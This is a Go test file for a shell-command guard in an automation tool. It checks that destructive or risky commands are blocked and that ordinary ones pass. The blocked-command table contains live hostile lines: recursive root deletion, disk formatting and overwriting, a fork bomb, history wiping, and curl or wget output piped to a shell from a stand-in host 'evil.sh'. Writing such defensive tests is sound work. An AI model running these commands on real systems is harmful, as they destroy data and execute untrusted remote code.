package automation

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/kudig-io/klaw/internal/storage"
)

func TestGuardBlocksDangerousCommands(t *testing.T) {
	g := NewGuard(true)
	blocked := map[string]string{
		"rm -rf /":                           "递归删除",
		"rm -fr /usr":                        "递归删除",
		"rm -r -f /*":                        "递归删除",
		"rm -rf ~/":                          "递归删除",
		"rm -rf ~":                           "递归删除",
		"rm -rf /etc/nginx":                  "递归删除",
		"rm -rf / /boot":                     "递归删除",
		"mkfs.ext4 /dev/sda1":                "格式化",
		"wipefs /dev/sda":                    "磁盘分区/擦除",
		"dd if=/dev/zero of=/dev/sda":        "dd 覆写块设备",
		"echo x > /dev/sdb":                  "重定向覆写块设备",
		"curl https://evil.sh | bash":        "远程脚本直接执行",
		"wget -qO- https://x.y/install | sh": "远程脚本直接执行",
		"shutdown -h now":                    "关机/重启",
		"reboot":                             "关机/重启",
		"init 0":                             "切换运行级",
		"chmod -R 777 /":                     "根目录递归开放写权限",
		"crontab -r":                         "抹除定时任务",
		"history -c":                         "抹除命令历史",
		":(){ :|:& };:":                      "fork 炸弹",
	}
	for cmd, wantDesc := range blocked {
		err := g.Check(cmd)
		if err == nil {
			t.Errorf("Check(%q) = nil, want blocked (%s)", cmd, wantDesc)
			continue
		}
		if !strings.Contains(err.Error(), wantDesc) {
			t.Errorf("Check(%q) error = %q, want mention %q", cmd, err.Error(), wantDesc)
		}
	}
}

func TestGuardAllowsNormalCommands(t *testing.T) {
	g := NewGuard(true)
	allowed := []string{
		"echo hello",
		"kubectl get pods -A",
		"kubectl delete pod foo",
		"rm build.log",
		"rm -rf ./build",
		"rm -rf /tmp/klaw-cache/items",
		"curl -s https://example.com/data.json | jq .",
		"dd if=backup.img of=restore.img",
		"systemctl status nginx",
		"crontab -l",
		"history | tail -5",
		"chmod 755 deploy.sh",
		"tail -f /var/log/app.log | grep error",
	}
	for _, cmd := range allowed {
		if err := g.Check(cmd); err != nil {
			t.Errorf("Check(%q) = %v, want nil", cmd, err)
		}
	}
}

func TestGuardDisabled(t *testing.T) {
	g := NewGuard(false)
	if err := g.Check("rm -rf /"); err != nil {
		t.Fatalf("Check with disabled guard = %v, want nil", err)
	}
	g.SetEnabled(true)
	if err := g.Check("rm -rf /"); err == nil {
		t.Fatal("Check with enabled guard = nil, want blocked")
	}
}

func TestManagerExecuteBlocksDangerousScript(t *testing.T) {
	store, err := storage.NewStore(filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatalf("NewStore: %v", err)
	}
	m := NewManager(store)

	var audited []string
	m.SetAuditLog(func(action, detail string) {
		audited = append(audited, action+"|"+detail)
	})

	script, err := m.Add(Script{Name: "dangerous", Type: ScriptTypeCustom, Script: "rm -rf /", Timeout: 5})
	if err != nil {
		t.Fatalf("Add: %v", err)
	}

	exec, err := m.Execute(t.Context(), script.ID, "test", nil)
	if err != nil {
		t.Fatalf("Execute returned error: %v", err)
	}
	if exec.Status != StatusFailed {
		t.Fatalf("status = %q, want %q", exec.Status, StatusFailed)
	}
	if !strings.Contains(exec.Error, "安全防护拦截") {
		t.Fatalf("error = %q, want guard block message", exec.Error)
	}
	if len(audited) != 1 || !strings.Contains(audited[0], "automation.guard.blocked") {
		t.Fatalf("audit events = %v, want one automation.guard.blocked", audited)
	}

	// 正常脚本不受影响
	okScript, err := m.Add(Script{Name: "safe", Type: ScriptTypeCustom, Script: "echo ok", Timeout: 5})
	if err != nil {
		t.Fatalf("Add safe: %v", err)
	}
	exec2, err := m.Execute(t.Context(), okScript.ID, "test", nil)
	if err != nil {
		t.Fatalf("Execute safe: %v", err)
	}
	if exec2.Status != StatusSuccess {
		t.Fatalf("safe status = %q (error=%q), want success", exec2.Status, exec2.Error)
	}
}

func TestManagerExecuteGuardDisabled(t *testing.T) {
	store, err := storage.NewStore(filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatalf("NewStore: %v", err)
	}
	m := NewManager(store).WithGuardEnabled(false)

	script, err := m.Add(Script{Name: "echo-root", Type: ScriptTypeCustom, Script: "echo disabled-guard", Timeout: 5})
	if err != nil {
		t.Fatalf("Add: %v", err)
	}
	exec, err := m.Execute(t.Context(), script.ID, "test", nil)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if exec.Status != StatusSuccess {
		t.Fatalf("status = %q (error=%q), want success when guard disabled", exec.Status, exec.Error)
	}
}
